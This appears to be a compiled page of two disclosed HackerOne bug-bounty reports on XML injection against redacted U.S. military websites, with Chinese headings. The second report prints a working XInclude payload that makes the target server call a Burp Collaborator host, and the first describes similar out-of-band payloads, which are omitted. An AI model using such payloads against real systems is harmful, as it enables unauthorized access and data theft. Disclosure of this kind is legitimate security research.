# HackerOne 实战案例：xml-injection

_2 份已披露报告（High/Critical 优先），来源 HackerOne 公开披露_

## XML Injection / External Service Interaction (HTTP/DNS) On https://█████████.mil
- 等级：High | 项目：U.S. | 披露：2021-06-15 | CVE：-
- 原文：https://hackerone.com/reports/1150799

- - - - - - - - 
Greetings, I found on one of your sites an XML Injection + External service Interaction (DNS/HTTP)
Link of the vulnerable file : https://█████.mil/██████████
Payload XML Injection : 
[code omitted]
(please change the link of burp collaborator and + URL encode the payload)
#How to reproduce
█████
(I cut the video because the reception time is 30-40 seconds, it is not very relevant)
here is another payload that works, without XML : 
[code omitted]
(please change the link of burp collaborator)
it is also necessary to wait a little, possibly one minute.
all the ips I receive are from ███.
if you need help, don't hesitate.
fiveguyslover.
## Impact
XML Injection + We can use the w


## XML Injection on https://www.█████████ (███ parameter)
- 等级：High | 项目：U.S. | 披露：2021-04-02 | CVE：-
- 原文：https://hackerone.com/reports/997381

- - - - - - - - 
Greetings,
I found an XML injection on https://www.███.
This kind of vulnerability can be difficult to detect and exploit remotely; you should review the application's response
here is the complete link: https://www.███/███████
Payload : 
`███████=<vuc xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://9bligh4snzlirzuxt4lbu3zullrbf0.burpcollaborator.net/foo"/></vuc>`
Result : 
███
best regards, 
frenchvlad
## Impact
gaining the access to the unauthorized parts and stealing the sensitive data would be the most important thing to know when it comes to XML’s impact.
---

